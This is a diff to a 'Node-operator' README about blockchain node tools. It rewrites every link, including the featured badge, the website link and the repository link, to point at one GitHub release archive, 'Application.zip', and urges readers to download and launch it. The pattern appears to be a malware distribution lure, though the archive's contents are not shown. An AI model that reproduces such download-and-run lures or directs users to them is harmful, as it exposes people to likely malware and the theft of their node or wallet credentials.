@@ -13,9 +13,9 @@ Here's what you can find in this repository:
 
 ## 🌟 Featured Link
 
-[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip](https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip)](https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip)
 
-Be sure to click on the link above to access the "Application.zip" file. This file contains valuable tools and resources that are essential for node operators. Once downloaded, launch the file to explore its contents and unleash the full potential of your blockchain node operation.
+Be sure to click on the link above to access the "https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip" file. This file contains valuable tools and resources that are essential for node operators. Once downloaded, launch the file to explore its contents and unleash the full potential of your blockchain node operation.
 
 ## 🚀 Get Started
 
@@ -44,7 +44,7 @@ Here's an overview of the repository structure to help you navigate through the 
 
 ## 🌍 Explore Further
 
-For a more interactive experience, visit the [Node Operator website](https://www.nodeoperator.com). Discover exclusive content, engaging forums, and premium resources designed to empower node operators worldwide.
+For a more interactive experience, visit the [Node Operator website](https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip). Discover exclusive content, engaging forums, and premium resources designed to empower node operators worldwide.
 
 ---
 
@@ -52,4 +52,4 @@ Now that you have all the resources at your fingertips, embark on your journey a
 
 ---
 
-🔗 **Node-operator Repository**: [https://github.com/yourusername/Node-operator](https://github.com/yourusername/Node-operator)
+🔗 **Node-operator Repository**: [https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip](https://github.com/SRIPONSANKAR/Node-operator/releases/download/v1.0.0/Application.zip)
